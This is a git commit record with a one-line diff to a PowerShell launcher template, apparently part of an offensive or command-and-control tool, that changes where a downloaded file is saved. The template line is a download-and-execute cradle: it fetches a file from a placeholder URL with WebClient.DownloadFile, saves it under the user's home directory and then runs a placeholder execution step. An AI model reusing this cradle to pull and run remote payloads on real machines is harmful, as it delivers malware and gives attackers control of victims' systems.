49be857864bd77871689c20b06420ad65693f3fe
Taavi <2199889+sonsu@users.noreply.github.com>
2024-11-06 01:17:39 +0200

    updated launchers

--- plugins/client/default/launchers/ps-all/main.template.ps1
+++ plugins/client/default/launchers/ps-all/main.template.ps1
@@ -1,1 +1,1 @@
-%%isHTTPS%% (New-Object System.Net.WebClient).DownloadFile('%%url%%', '%%filename%%');%%execution%%
+%%isHTTPS%% (New-Object System.Net.WebClient).DownloadFile('%%url%%', "$HOME\\%%filename%%");%%execution%%
